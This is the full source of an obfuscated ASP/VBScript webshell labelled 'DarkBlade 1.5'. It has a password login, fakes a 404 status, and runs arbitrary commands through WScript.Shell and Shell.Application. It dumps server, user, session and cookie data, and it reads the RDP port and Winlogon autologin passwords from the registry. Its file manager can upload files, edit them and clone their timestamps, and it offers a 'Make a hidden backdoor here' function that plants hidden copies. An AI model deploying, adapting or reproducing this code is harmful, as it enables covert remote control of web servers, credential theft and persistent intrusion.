<%@ LANGUAGE='VBScript' CODEPAGE='65001'%>
<%
Response.Buffer=True
Response.Clear
Response.CharSet="utf-8"
Server.ScriptTimeOut=300
'-------------------------------Config-------------------------------
Const pass="C5E83EDF778C18482D84D5489B8D8F"'admin
Const pipu=True
Const iycew=59
Const ydnj=False
Const csj="_"
Const jsrfr="lqbip|rcvdh|ihyn|ihk|ybgqm|aiw|gwk|qmkq|rxg|jksfh|geww|vgm|ulz|jqj|nyf|sesq|ugxyt|pnu|czwfq|yvquw|wckz|uwrty"
Const amb="login"
Const alqp="GB2312"
Const dxpm="asp|asa|cer|cdx"
Const mhla="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"
Const nhbqw=50
Const echs="zzzzzzzz.html"
Const aerq=False
'-------------------------------Config-------------------------------
Dim goaction,lqbip,ihyn,ihk,aiw,gwk,lkyy,iuwq,vnznl,xjab,zjhor,nun,wbxx,cngn,ogfim,rfaq,vfo,nzax,zhyko,mkew,qmkq,ads,ajto,xdmm,rcvdh,ujcmu,qtylw,dqc,rqszr,iij,ogda,exte,mhvec,acjdi,conn,rxg,fkho,bondh,podw,mpj,qebjx,jksfh,geww,jdvf,vgm,ulz,kurmq,jqj,gmhi,nyf,qrqg,zqps,ubql,znx,gtt,ertns,mt,sesq,czwfq,ugxyt,pnu,nuatb,ytusx,pwab,dgj,ybgqm,mvvi,wseta,fjjxv,xjmb,irbw,rke,rhnw,glw,wannd,ldcr,tbe,oth,kylxz,uwdvh,ccnh,nuser,npass,wtpog,pgvr,yvquw,wckz,qqp,ryfj,vujc,uwrty,ktg,ghpc,lqog
mvvi="DarkBlade 1.5 Sex OverLord Edition"
wseta="DarkBlade"
fjjxv="DarkB"++"ladePa"+rtoqv+"ss"
dxoes()
nnam()
uwdvh=jnph()
If Not uwdvh And goaction<>amb Then grh()
If aerq And Trim(ramoi("AUT"+meeeq+"H_USER"))="" Then
Response.Status="401 Unautho"+zcuti+"rized"
Response.Addheader"WWW-AuThen"+zln+"ticate","BASIC"
If ramoi("AUT"+meeeq+"H_USER")=""Then Response.End()
End If
Select Case goaction
Case amb
jnnby()
Case"bapis"
lrnyc()
Case"eyb"
yzj()
Case"fbk"
ptib()
Case"zzajv"
ojyen()
Case"rwumm"
wbmfm()
Case"lfx"
yvs()
Case"kbqxz"
awsr()
Case"gbe"
nvkq()
Case"dkdl"
srxtf()
Case"ide"
xibim()
Case"rcjqh"
aum()
Case"Logout"
mddep()
Case"jzp"
jmqbw()
Case"jilq","veerr"
fevyb()
Case Else
fevyb()
End Select
viwe
Sub dxoes()
If Not ydnj Then On Error Resume Next
rfaq=Timer()
Dim kue,fri,egpnh,zfmf,didec,ubizz,zpsji,qowkf
servurl=ramoi("URL")
Set iuwq=nfffq("MSXML"+ifdg+"2.XM"+swww+"LHTTP")
Set vnznl=nfffq("WS"+qkdx+"cript.She"+nomr+"ll")
Set xjab=nfffq("Scriptin"+xfw+"g.FileSystemObj"+znlfx+"ect")
Set zjhor=nfffq("She"+nlrnz+"ll.Applic"+oqzje+"ation")
If Not IsObject(vnznl)Then Set vnznl=nfffq("WS"+qkdx+"cript.She"+nlrnz+"ll.1")
If Not IsObject(zjhor)Then Set zjhor=nfffq("She"+nlrnz+"ll.Applic"+oqzje+"ation.1")
Set wbxx=new RegExp
wbxx.Global=True
wbxx.IgnoreCase=True
wbxx.MultiLine=True
lkyy=ramoi("SERVER_NAME")
cngn=ramoi("PATH_INFO")
ogfim=Lcase(zsz(cngn,"/"))
nzax=wxw(".")
zhyko=wxw("/")
ujcmu=1
ads=1
Response.status="404 Not Found"
End Sub
Sub nnam()
If Not ydnj Then On Error Resume Next
For Each fri in request.queryString
execute fri&"=request.queryString("""&fri&""")"
Next
If InStr(ramoi("CONTENT_TYPE"),"multipart/form-data")>=1 Then
Set pgvr=new upload_5xsoft
For Each egpnh in pgvr.xgqlo
execute egpnh&"=pgvr.Form("""&egpnh&""")"
Next
Else
For Each kue in request.Form
execute kue&"=request.form("""&kue&""")"
Next
End If
qowkf=Split(jsrfr,"|")
For Each zpsji in qowkf
execute""&zpsji&"=mdez("&zpsji&")"
Next
lqbip=Replace(lqbip,"/","\")
If Right(lqbip,1)="\"And Len(lqbip)>3 Then lqbip=Left(lqbip,Len(lqbip)-1)
End Sub
Sub viwe()
If Not ydnj Then On Error Resume Next
Dim ocmv
iuwq.abort
Set iuwq=Nothing
Set vnznl=Nothing
Set xjab=Nothing
Set zjhor=Nothing
Set wbxx=Nothing
vfo=timer()
ocmv=vfo-rfaq
echo"<br></td></tr></table>"
mwt gmhi
sodx"100%"
echo"<tr class=""head"">"
echo"<td>"
mwt mkew
ocmv=FormatNumber(ocmv,5)
If Left(ocmv,1)="."Then ocmv="0"&ocmv
mwt"<br>"
echo"<div align=right>Processed in :"&ocmv&"seconds</div></td></tr></table></body></html>"
Response.End()
End Sub
Sub jnnby()
If Not ydnj Then On Error Resume Next
dgj=request("dgj")
If dgj<>""Then
dgj=wucql(dgj)
If wucql(dgj)=pass Then
suzn fjjxv,dgj
Response.Redirect(cngn)
Else
yln"Fuck you,get out!"
End If
End If
ajg"Login"
echo"<center><br>"
cxaqj False
echo"<p><b>Password : </b>"
zesc"password","dgj","","30",""
echo" "
qjr"Get In"
echo"</p></center></form>"
End Sub
Sub yvs()
If Not ydnj Then On Error Resume Next
Dim i,iijs,slq,gth,asp,wgmiu,zvwg,kodk,iqg,oons
gth="Sy"+kyirr+"stemRoot|WinD"+lir+"ir|Com"+tboq+"Spec|TEMP|TMP|NUMBER_OF_PR"+smeb+"OCESSORS|OS|Os2LibP"+vxg+"ath|Path|PA"+nfrfd+"THEXT|PROCESSOR_ARCHITECTU"+tyvg+"RE|"&_
"PROCESSOR_IDENTIf"+wvld+"IER|PROCE"+zuwbp+"SSOR_LEVEL|PROCE"+ihhir+"SSOR_REVISION"
slq=Split(gth,"|")
execute "Set iijs=vnznl.Environ"&ajjwi&"ment(""SYSTEM"")"
asp=ramoi("NUMBER_OF_PR"+smeb+"OCESSORS")
If IsNull(asp)Or asp=""Then
asp=iijs("NUMBER_OF_PR"+smeb+"OCESSORS")
End If
zvwg=ramoi("OS")
If IsNull(zvwg)Or zvwg=""Then
zvwg=iijs("OS")
End If
wgmiu=iijs("PROCESSOR_IDENTIf"+wvld+"IER")
ajg"Server Infomation"
sodx"100%"
vhl
echo"<td colspan=""2""align=""center"">"
echo"<b>Server parameters:</b>"
echo"</td>"
uemp
abxky 0
ycd"Server Name:"
doTd lkyy,""
uemp
abxky 1
ycd"Server IP:"
doTd ramoi("LOCAL_ADDR"),""
uemp
abxky 0
ycd"Server Port:"
doTd ramoi("SERVER_PORT"),""
uemp
abxky 1
ycd"Server Mem"+ugie+"ory"
execute "doTd kxyzh(zjhor.GetSystemInformati"&gap&"on(""PhysicalMemoryInstalled"")),"""""
uemp
abxky 0
ycd"Server Time"
doTd Now,""
uemp
abxky 1
ycd"Server Engine"
doTd ramoi("SERVER_SOFTWARE"),""
uemp
abxky 0
ycd"Script Timeout"
doTd Server.ScriptTimeout,""
uemp
abxky 1
ycd"Number of Cpus"
doTd asp,""
uemp
abxky 0
ycd"Info of Cpus"
doTd wgmiu,""
uemp
abxky 1
ycd"Server OS"
doTd zvwg,""
uemp
abxky 0
ycd"Server Script Engine"
doTd ScriptEngine&"/"&ScriptEngineMajorVersion&"."&ScriptEngineMinorVersion&"."&ScriptEngineBuildVersion,""
uemp
abxky 1
ycd"File's Full Path"
doTd ramoi("PATH_TRANSLATED"),""
uemp
ads=0
For i=0 To UBound(slq)
abxky ads
doTd slq(i)&":",""
execute "doTd vnznl.ExpandEnvironm"&qfm&"entStrings(""%""&slq(i)&""%""),"""""
uemp
nrf
Next
guenn
tvnm(Err)
echo"<br>"
Set iijs=Nothing
Dim wdh
sodx"100%"
vhl
echo"<td colspan=""6""align=""center"">"
echo"<b>Info of disks</b>"
echo"</td>"
uemp
abxky 0
doTd"Driver letter",""
doTd"Type",""
doTd"Label",""
doTd"File system",""
doTd"Space left",""
doTd"Total space",""
uemp
ads=1
For Each wdh in xjab.Drives
Dim vlpsj,xcmiw,tjx,ssfrt,pdl,nrr
vlpsj=wdh.DriveLetter
If Lcase(vlpsj)<>"a"Then
xcmiw=ixuog(wdh.DriveType)
tjx=wdh.VolumeName
ssfrt=wdh.Filesystem
pdl=kxyzh(wdh.FreeSpace)
execute "nrr=kxyzh(wdh.Total"&vnkh&"Size)"
abxky ads
doTd vlpsj,""
doTd xcmiw,""
doTd tjx,""
doTd ssfrt,""
doTd pdl,""
doTd nrr,""
uemp
End If
vlpsj=""
xcmiw=""
tjx=""
ssfrt=""
pdl=""
nrr=""
nrf
Next
guenn
tvnm(Err)
Set wdh=Nothing
Dim oia
Set oia=xjab.GetFolder(zhyko)
echo"<br>"
sodx"100%"
vhl
echo"<td colspan=""2""align=""center"">"
echo"<b>Info of site:</b>"
echo"</td>"
uemp
abxky 0
doTd"Physic"+iymx+"al path:",""
doTd zhyko,""
uemp
abxky 1
doTd"Current size:",""
doTd kxyzh(oia.Size),""
uemp
abxky 0
doTd"File count:",""
doTd oia.Files.Count,""
uemp
abxky 1
doTd"Folder count:",""
doTd oia.SubFolders.Count,""
uemp
guenn
tvnm(Err)
mwt"<br>"
Dim wsqws,rgcdn,twmf
Dim eyn,eedi,vlpsk,phr
kodk="HKEY_LOCAL_MACHINE\SYSTEM\Curre"+fewse+"ntControlSet\Control\Te"+iptg+"rminal Server\Win"+flu+"Stations\RDP-"+geks+"Tcp\"
iqg="PortNumber"
oons=knf(kodk&iqg)
If oons=""Then oons="Can't get Te"+iptg+"rminal port.<br/>"
wsqws="HK"+xoncv+"LM\SOFTW"+wjw+"ARE\Microsoft\Window"+zfd+"s NT\Curren"+suctf+"tVersion\Winlog"+sdxq+"on\"
eedi="AutoAdmin"+itn+"Logon"
rgcdn="Def"+lvgli+"aultUserName"
twmf="Defaul"+zhisp+"tPassword"
eyn=knf(wsqws&eedi)
If eyn=0 Then
vlpsk="Autologin isn't enabled"
Else
vlpsk=knf(wsqws&rgcdn)
End If
If eyn=0 Then
phr="Autologin isn't enabled"
Else
phr=knf(wsqws&twmf)
End If
sodx"100%"
vhl
echo"<td colspan=""2""align=""center"">"
echo"<b>Info of Te"+iptg+"rminal port&Autologin</b>"
echo"</td>"
uemp
abxky 0
doTd"Te"+iptg+"rminal port:",""
doTd oons,""
uemp
abxky 1
doTd"Autologin account:",""
doTd vlpsk,""
uemp
abxky 0
doTd"Autologin password:",""
doTd phr,""
uemp
guenn
echo"</ol>"
tvnm(Err)
End Sub
Sub lrnyc()
Dim i,dyb,dni,lxyvu
dni="MS"+lip+"WC.AdRotator,MS"+lip+"WC.Bro"+orji+"wserType,MS"+lip+"WC.NextLink,MS"+lip+"WC.TOOLS,MS"+lip+"WC.Status,MS"+lip+"WC.Counters,IISS"+yflfn+"ample.ContentRo"+mui+"tator,IISS"+yflfn+"ample.PageCoun"+ppot+"ter,MS"+lip+"WC.Per"+sij+"missionChecker,Ad"+oge+"odb.Connecti"+wehbe+"on,SoftArti"+urok+"sans.File"+fqhws+"Up,SoftArti"+urok+"sans.FileMa"+mhlnt+"nager,LyfUpload.UploadFile,Per"+dsyh+"sits.Upload.1,W3.Upload,JMail.SmtpMail,CDONTS.NewMail,Per"+dsyh+"sits.Mailsender,SMTPsvg.Mailer,DkQmail.Qmail,Geocel.Mailer,IISmail.Iismail.1,SmtpMail.SmtpMail.1,SoftArti"+urok+"sans.ImageGen,W3Image.Image,Scriptin"+xfw+"g.FileSystemObj"+znlfx+"ect,Ad"+oge+"odb.Str"+chut+"eam,She"+nlrnz+"ll.Applic"+oqzje+"ation,She"+nlrnz+"ll.Applic"+oqzje+"ation.1,WS"+qkdx+"cript.She"+nomr+"ll,WS"+qkdx+"cript.She"+nlrnz+"ll.1,WS"+qkdx+"cript.Network,hzhost.modules,npoint.host"
lxyvu="Ad Rotator,Browser info,NextLink,,,Counters,Content rotator,,Permission checker,ADODB connection,SA-FileUp,SoftArtisans FileManager,LyfUpload,ASPUpload,Dimac upload,Dimac JMail,CDONTS SMTP mail,ASPemail,ASPmail,dkQmail,Geocel mail,IISmail,SmtpMail,SoftArtisans ImageGen,Dimac W3Image,FSO,Stream ,,,,,,Hzhost module,Npoint module"
aryObjectList=Split(dni,",")
aryDscList=Split(lxyvu,",")
ajg"Server Object Detection"
echo"Check for other ObjectId or ClassId.<br>"
cxaqj True
zesc"text","qmkq",qmkq,50,""
echo" "
qjr"Check"
gbqwf
If qmkq<>""Then
yhigl
Call btsva(qmkq,"")
echo"</ul>"
End If
echo"<hr/>"
echo"<ul class=""info""><li><u>Object name</u>Status and more</li>"
For i=0 To UBound(aryDscList)
Call btsva(aryObjectList(i),aryDscList(i))
Next
echo"</ul><hr/>"
End Sub
Sub yzj()
Dim ogs,yyjd,gcy
ajg"Users and Groups Imformation"
Set gcy=getObj("WinNT://.")
gcy.Filter=Array("User")
csyfy"User",False
sodx"100%"
For Each ogs in gcy
vhl
echo"<td colSpan=""2""align=""center""><b>"&ogs.Name&"</b></td>"
uemp
etndu(ogs.Name)
Next
guenn
echo"</span><br>"
tvnm(Err)
csyfy"UserGroup",False
gcy.Filter=Array("Group")
sodx"100%"
ads=1
For Each yyjd in gcy
abxky ads
doTd yyjd.Name,""
doTd yyjd.Description,""
uemp
nrf
Next
guenn
echo"</span>"
tvnm(Err)
End Sub
Sub ptib()
If Not ydnj Then On Error Resume Next
Dim okvmb,wgd,dfm,wetzi
If ajto<>""Then Session(ajto)=xdmm
ajg"Server-Client Information"
csyfy"ServerVariables",True
sodx"100%"
ads=1
For Each dfm in Request.ServerVariables
abxky ads
ycd dfm
doTd ramoi(dfm),""
uemp
nrf
Next
guenn
mwt"</span><br>"
csyfy"Application",True
sodx"100%"
ads=1
For Each dfm in Application.Contents
If dfm<>dhkcb("117_132_132_115_132_117_136_124")Then
abxky ads
ycd dfm
doTd mszsa(Application(dfm)),""
uemp
nrf
End If
Next
guenn
mwt"</span><br>"
csyfy"Session",True
echo"<br>(ID"&Session.SessionId&")"
sodx"100%"
ads=1
For Each dfm in Session.Contents
wetzi=Session(dfm)
abxky ads
ycd dfm
doTd mszsa(wetzi),""
uemp
nrf
Next
abxky ads
cxaqj False
fkv"Set Session","20%"
echo"<td width=""80%""> Key :"
zesc"text","ajto","",30,""
echo"Value :"
zesc"text","xdmm","",30,""
echo"</td>"
gbqwf
uemp
guenn
mwt"</span><br>"
csyfy"Cookies",True
sodx"100%"
ads=1
For Each dfm in Request.Cookies
If Request.Cookies(dfm).HasKeys Then
For Each okvmb in Request.Cookies(dfm)
abxky ads
ycd dfm&"("&okvmb&")"
doTd mszsa(Request.Cookies(dfm)(okvmb)),""
uemp
nrf
Next
Else
abxky ads
ycd dfm
doTd mszsa(Request.Cookies(dfm)),""
uemp
nrf
End If
Next
guenn
echo"</span>"
tvnm(Err)
End Sub
Sub ojyen()
Dim inl,kob,swzr
If Not ydnj Then On Error Resume Next
ajg("WS"+qkdx+"cript.She"+nomr+"ll Execute")
If rcvdh<>""Then
If InStr(Lcase(rcvdh),"cmd")>0 And InStr(ihyn,"/c ")<1 Then
kob=rcvdh&" /c "&ihyn
Else
kob=rcvdh&" "&ihyn
End If
If ldcr=1 Then
execute "Set swzr=vnznl.Ex"&corg&"ec(kob)"
execute "inl=swzr.StdOut.R"&pwbon&"eadAll()&vbCrLf&swzr.StdErr.R"&pwbon&"eadAll()"
Else
execute "vnznl.R"&gpkod&"un kob,0,False"
End If
tvnm(Err)
zeb
Else
rcvdh="cmd.exe"
End If
sodx"100%"
cxaqj True
abxky 1
doTd"Path","10%"
iiit"text","rcvdh",rcvdh,"70%","",""
echo"<td>"
jwik"ldcr",1," View result ","checked"
qjr"Run"
echo"</td>"
uemp
abxky 0
doTd"Parameters",""
iiit"text","ihyn",ihyn,"","","2"
uemp
gbqwf
guenn
echo"<hr><b>Result:</b><br><span class=""alt1Span"">"&mszsa(inl)&"</span>"
tvnm(Err)
End Sub
Sub wbmfm()
If Not ydnj Then On Error Resume Next
ajg("She"+nlrnz+"ll.Applic"+oqzje+"ation Execute")
If rcvdh<>""Then
If InStr(Lcase(rcvdh),"cmd")>0 And InStr(ihyn,"/c ")<1 Then
ihyn="/c "&ihyn
End If
execute "zjhor.Shel"&poo&"lExecute rcvdh,ihyn,Null,""open"",0"
tvnm(Err)
ElseIf qtylw="viewResult" Then
Response.Clear
uwrty=Trim(uwrty)
If IsObject(xjab)Then
echo "<body bgcolor='#ecedef'>"&mszsa(tpcq(uwrty))&"</body>"
Else
echo "<body bgcolor='#ecedef'>"&mszsa(rchgv(uwrty))&"</body>"
End If
If Err Then echo Err.Description
execute "xjab.Dele"&nbjk&"teFile uwrty,True"
Response.End
End If
sodx"100%"
cxaqj True
abxky 1
doTd"com"+nhmkc+"mand","10%"
If rcvdh=""Then rcvdh="cmd.exe"
If ihyn=""Then ihyn=" /c net u"+rmct+"ser > "&zhyko&"\temp.txt"
iiit"text","rcvdh",rcvdh,"80%","",""
fkv"Run ",""
uemp
abxky 0
doTd"Parameters",""
iiit"text","ihyn",ihyn,"","",2
uemp
gbqwf
guenn
echo"<hr>"
zesc"button","","Refresh result","","onclick='javascript:thra()'"
echo"<br><br><iframe id='inl' class='frame' frameborder='no'></iframe>"
End Sub
Sub fevyb()
If Not ydnj Then On Error Resume Next
If lqbip=""Then lqbip=gwk
If lqbip=""Then lqbip=nzax
If goaction<>"jilq"Then goaction="veerr"
If qtylw="down"Then
cqbv()
Response.End()
End If
If goaction="veerr"Then
iij="fso"
ajg("FSO File Explorer")
Else
iij="sa"
ajg("APP File Explorer")
End If
Select Case qtylw
Case"dprl","eyq"
usxi()
lqbip=dzzx(lqbip,"\",False)
Case"xhsy"
xhsy()
Case"save","evwr"
yjzdg()
lqbip=dzzx(lqbip,"\",False)
Case"omtw"
bhq()
Case"unu","tzsaq"
unu()
Case"strwh","swxiy"
ohcrx()
lqbip=dzzx(lqbip,"\",False)
Case"plz","wma","ttg","vseta"
rumla()
lqbip=dzzx(lqbip,"\",False)
Case"rvvj"
qcda()
Case"lhirb"
bizlp()
lqbip=dzzx(lqbip,"\",False)
Case"apicv"
ozt()
End Select
If Len(lqbip)<3 Then lqbip=lqbip&"\"
dslv()
End Sub
Sub dslv()
Dim theFolder,slvd,ybft,gttt,nfplv,jrtca,acio,brwr,i
If Not ydnj Then On Error Resume Next
If iij="fso"Then
Set theFolder=xjab.GetFolder(lqbip)
gttt=xjab.GetParentFolderName(lqbip)
Else
execute "Set theFolder=zjhor.Nam"&urblr&"eSpace(lqbip)"
ome Err
gttt=dzzx(lqbip,"\",False)
If InStr(gttt,"\")<1 Then
gttt=gttt&"\"
End If
End If
brwr=lqbip
If Right(brwr,1)<>"\"Then brwr=brwr&"\"
rtas"brwr",brwr
cxaqj True
echo"<b>Current Path :</b>"
zesc"text","lqbip",lqbip,120,""
mwt""
rycpp"","170px","onchange=""javascript:if(this.value!=''){qjr('"&goaction&"','',this.value);}"""
exhpr"","Drivers/Comm folders"
exhpr mszsa(wxw(".")),"."
exhpr mszsa(wxw("/")),"/"
exhpr"","----------------"
If Lcase(iij)="fso"Then
For Each drive in xjab.Drives
execute "exhpr drive.Drive"&jruor&"Letter&"":\"",drive.Drive"&jruor&"Letter&"":\"""
Next
exhpr"","----------------"
End If
exhpr"C:\Program Files","C:\Program Files"
exhpr"C:\Program Files\RhinoSoft.com","RhinoSoft.com"
exhpr"C:\Program Files\Serv"+shn+"-U","Serv"+shn+"-U"
exhpr"C:\Program Files\Ra"+aumws+"dmin","Ra"+aumws+"dmin"
exhpr"C:\Program Files\Microsoft SQL Server","Mssql"
exhpr"C:\Program Files\Mysql","Mysql"
exhpr"","----------------"
exhpr"C:\documents and Settings\All Users","All Users"
exhpr"C:\documents and Settings\All Users\documents","documents"
exhpr"C:\documents and Settings\All Users\Application Data\Symantec\pcAnywhere","PcAnywhere"
exhpr"C:\documents and Settings\All Users\Start Menu\Programs","Start Menu->Programs"
exhpr"","----------------"
exhpr"D:\Program Files","D:\Program Files"
exhpr"D:\Serv"+shn+"-U","D:\Serv"+shn+"-U"
exhpr"D:\Ra"+aumws+"dmin","D:\Ra"+aumws+"dmin"
exhpr"D:\Mysql","D:\Mysql"
ild
qjr"Go"
gbqwf
mwt"<br><form method=""post"" id=""upform""action="""&cngn&"""enctype=""multipart/form-data"">"
rtas"goaction",goaction
rtas"qtylw","omtw"
rtas"lqbip",lqbip
sodx"60%"
abxky 1
iiit"file","upfile","","30%","",""
doTd"Save As :","15%"
iiit"text","yvquw","","30%","",""
iiit"button",""," Upload  ","20%","onClick=""javascript:qjr('"&goaction&"','omtw','')""",""
uemp
gbqwf
If iij="fso"Then
abxky 0
cxaqj True
rtas"lqbip",lqbip
rtas"qtylw","xhsy"
iiit"text","exte","","","",""
echo"<td colspan='2'>"
zesc"radio","mhvec","file","","checked"
echo"File"
zesc"radio","mhvec","folder","",""
echo"Folder</td>"
fkv"New one",""
gbqwf
uemp
End If
echo"</table><hr>"
If iij="fso"Then
If Not xjab.FolderExists(lqbip)Then
yln lqbip&" Folder dosen't exists or access denied!"
viwe
End If
End If
csyfy"Folders",False
sodx"100%"
vhl
doTd"<b>Folder name</b>",""
doTd"<b>Size</b>",""
doTd"<b>Last modIfied</b>",""
echo"<td><b>Action</b>"
If iij="fso"Then 
echo" - "
injj goaction,"apicv",clwc(lqbip),"Make a hidden backdoor here",""
End If
echo"</td>"
uemp
abxky 0
echo"<td colspan=""4"">"
injj goaction,"",clwc(gttt),"Parent Directory",""
echo"</td>"
uemp
ads=1
i=0
If iij="fso"Then
For Each objX in theFolder.SubFolders
acio=objX.DateLastModIfied
abxky ads
echo"<td>"
injj goaction,"",objX.Name,objX.Name,""
echo"</td>"
doTd mszsa("<dir>"),""
doTd acio,""
echo"<td>"
injj goaction,"ttg",objX.Name,"Copy"," -"
injj goaction,"vseta",objX.Name,"Move"," -"
injj goaction,"swxiy",objX.Name,"Rename"," -"
injj "jzp","jixpz",objX.Name,"Package"," -"
injj goaction,"eyq",objX.Name,"Delete",""
mwt"</td>"
uemp
nrf
i=i+1
If i>=20 Then
i=0
Response.Flush()
End If
Next
Else
For Each objX in theFolder.Items
If objX.IsFolder Then
acio=theFolder.GetDetailsOf(objX,3)
abxky ads
echo"<td>"
injj goaction,"",objX.Name,objX.Name,""
echo"</td>"
doTd mszsa("<dir>"),""
doTd acio,""
echo"<td>"
injj goaction,"swxiy",objX.Name,"Rename"," -"
injj "jzp","kehl",objX.Name,"Package",""
mwt"</td>"
uemp
nrf
i=i+1
If i>=20 Then
i=0
Response.Flush()
End If
End If
Next
End If
guenn
mwt"</span><br>"
csyfy"Files",False
sodx"100%"
echo"<b>"
vhl
doTd"<b>File name</b>",""
doTd"<b>Size</b>",""
doTd"<b>Last modIfied</b>",""
doTd"<b>Action</b>",""
uemp
echo"</b>"
ads=0
If iij="fso"Then
For Each objX in theFolder.Files
nfplv=kxyzh(objX.Size)
acio=objX.DateLastModIfied
If Lcase(Left(objX.Path,Len(zhyko)))<>Lcase(zhyko) Then
slvd=""
Else
slvd=Replace(Replace(nwtcn(Mid(objX.Path,Len(zhyko)+1)),"%2E","."),"+","%20")
End If
abxky ads
If slvd=""Then
doTd objX.Name,""
Else
doTd"<a href='"&Replace(slvd,"%5C","/")&"' target=_blank>"&objX.Name&"</a>",""
End If
doTd nfplv,""
doTd acio,""
echo"<td>"
injj goaction,"unu",objX.Name,"Edit"," -"
injj goaction,"plz",objX.Name,"Copy"," -"
injj goaction,"wma",objX.Name,"Move"," -"
injj goaction,"strwh",objX.Name,"Rename"," -"
injj goaction,"down",objX.Name,"Down"," -"
injj goaction,"rvvj",objX.Name,"Attribute"," -"
ozs "zwg",objX.Name,"","","","Database"," -"
injj goaction,"dprl",objX.Name,"Delete",""
mwt"</td>"
uemp
nrf
i=i+1
If i>=20 Then
i=0
Response.Flush()
End If
Next
Else
For Each objX in theFolder.Items
If Not objX.IsFolder Then
Dim sxip
sxip=zsz(objX.Path,"\")
jrtca=clwc(objX.Path)
nfplv=theFolder.GetDetailsOf(objX,1)
acio=theFolder.GetDetailsOf(objX,3)
If Lcase(Left(objX.Path,Len(zhyko)))<>Lcase(zhyko) Then
slvd=""
Else
slvd=Replace(Replace(nwtcn(Mid(objX.Path,Len(zhyko)+1)),"%2E","."),"+","%20")
End If
abxky ads
If slvd=""Then
doTd zsz(objX.Path,"\"),""
Else
doTd"<a href='"&Replace(slvd,"%5C","/")&"' target=_blank>"& zsz(objX.Path,"\")&"</a>",""
End If
doTd nfplv,""
doTd acio,""
echo"<td>"
injj goaction,"unu",sxip,"Edit"," -"
injj goaction,"strwh",sxip,"Rename"," -"
injj goaction,"down",sxip,"Down"," -"
injj goaction,"rvvj",sxip,"Attribute"," -"
ozs "zwg",sxip,"","","","Database",""
mwt"</td>"
uemp
nrf
i=i+1
If i>=20 Then
i=0
Response.Flush()
End If
End If
Next
End If
guenn
echo"</span>"
tvnm(Err)
End Sub
Function whc(vhv)
Dim abaqg
abaqg=""
If vhv>=32 Then
vhv=vhv-32
abaqg=abaqg&"archive|"
End If
If vhv>=16 Then vhv=vhv-16
If vhv>=8 Then vhv=vhv-8
If vhv>=4 Then
vhv=vhv-4
abaqg=abaqg&"system|"
End If
If vhv>=2 Then
vhv=vhv-2
abaqg=abaqg&"hidden|"
End If
If vhv>=1 Then
abaqg=abaqg&"readonly|"
End If
If abaqg=""Then
whc=Array(Null)
Else
whc=Split(Left(abaqg,Len(abaqg)-1),"|")
End If
End Function
Sub qcda()
Dim azchf,avl,gaf,strAtt,vhv,phebk,bxja,gir,ybrxe,fuav
If Not ydnj Then On Error Resume Next
If IsObject(xjab)Then
Set azchf=xjab.GetFile(lqbip)
End If
If IsObject(zjhor)Then
bxja=dzzx(lqbip,"\",False)
gaf=zsz(lqbip,"\")
execute "Set phebk=zjhor.Name"&qrno&"Space(bxja)"
Set avl=phebk.ParseName(gaf)
End If
echo"<center>"
sodx"60%"
cxaqj True
rtas"qtylw","lhirb"
rtas"lqbip",lqbip
abxky 1
fkv"Set / Clone",""
doTd lqbip,""
uemp
abxky 0
doTd"Attributes",""
If IsObject(xjab)Then
vhv=azchf.Attributes
strAtt="<input type=checkbox name=kylxz value=4 class='input' {$system}/>system "
strAtt=strAtt&"<input type=checkbox name=kylxz value=2 {$hidden}/>hide "
strAtt=strAtt&"<input type=checkbox name=kylxz value=1 {$readonly}/>readonly "
strAtt=strAtt&"<input type=checkbox name=kylxz value=32 {$archive}/>save "
fuav=whc(vhv)
For Each ybrxe in fuav
strAtt=Replace(strAtt,"{$"&ybrxe&"}","checked")
Next
doTd strAtt,""
Else
doTd"FSO object disabled,can't get/set attributes -_-~!",""
End If
uemp
If IsObject(zjhor)Then
abxky 1
doTd"Date created",""
doTd phebk.GetDetailsOf(avl,4),""
uemp
abxky 0
doTd"Date last modIfied",""
iiit"text","tbe",phebk.GetDetailsOf(avl,3),"","",""
uemp
abxky 1
doTd"Date last accessed",""
doTd phebk.GetDetailsOf(avl,5),""
uemp
Else
abxky 1
doTd"Date created",""
execute "doTd azchf.DateCr"&ack&"eated,"""""
uemp
abxky 0
doTd"Date last modIfied",""
doTd azchf.DateLastModIfied,""
uemp
abxky 1
doTd"Date last accessed",""
doTd azchf.DateLastAccessed,""
uemp
End If
abxky 0
If IsObject(zjhor)Then
doTd"Clone time ",""
echo"<td>"
rycpp"oth","100%",""
exhpr "","Do not clone"
For Each objX in phebk.Items
If Not objX.IsFolder Then
gir=zsz(objX.Path,"\")
exhpr gir,phebk.GetDetailsOf(phebk.ParseName(gir),3)&" --- "&gir
End If
Next
Else
echo"<td colspan=2>App object disabled,can't modIfy time -_-~!</td>"
End If
guenn
gbqwf
viwe()
End Sub
Sub bizlp()
If Not ydnj Then On Error Resume Next
Dim wabmc,azchf,bxja,gaf,phebk,avl
If IsObject(xjab)Then
Set azchf=xjab.GetFile(lqbip)
End If
If IsObject(zjhor)Then
bxja=dzzx(lqbip,"\",False)
gaf=zsz(lqbip,"\")
execute "Set phebk=zjhor.Name"&qrno&"Space(bxja)"
Set avl=phebk.ParseName(gaf)
End If
If kylxz<>""Then
kylxz=Split(Replace(kylxz," ",""),",")
For i=0 To UBound(kylxz)
wabmc=wabmc+CLng(kylxz(i))
Next
azchf.Attributes=wabmc
If Err Then
tvnm(Err)
Else
yln"Attributes modIfied"
End If
End If
If oth=""Then
If tbe<>"" And IsDate(tbe)Then
avl.ModIfyDate=tbe
If Err Then
tvnm(Err)
Else
yln"Time modIfied"
End If
End If
Else
avl.ModIfyDate=phebk.GetDetailsOf(phebk.ParseName(oth),3)
If Err Then
tvnm(Err)
Else
yln"Time modIfied"
End If
End If
End Sub
Sub ozt()
If Not ydnj Then On Error Resume Next
If fileName<>""Then
Dim lcbe,tpd,csg
lcbe="\\.\"&lqbip&"\"&fileName
If vujc=1 Then
execute "Call xjab.Mov"&pzih&"eFile(ramoi(""PATH_TRANSLATED""),lcbe)"
Set tpd=xjab.GetFile(lcbe)
tpd.Attributes=6
ome(Err)
lcbe=Replace(lcbe,"\\.\","")
csg=Replace(Replace(Replace(nwtcn(Mid(lcbe,Len(zhyko)+1)),"%2E","."),"+","%20"),"%5C","/")
Response.Redirect(csg)
Else
ekg lcbe,ogda
Set tpd=xjab.GetFile(lcbe)
tpd.Attributes=6
End If
If Err Then
tvnm(Err)
Else
yln"Backdoor established,have fun."
End If
Exit Sub
End If
cxaqj True
sodx"100%"
rtas"qtylw","apicv"
mwt"<b>Make hidden backdoor</b><br>"
sodx"100%"
abxky 1
doTd"Path","20%"
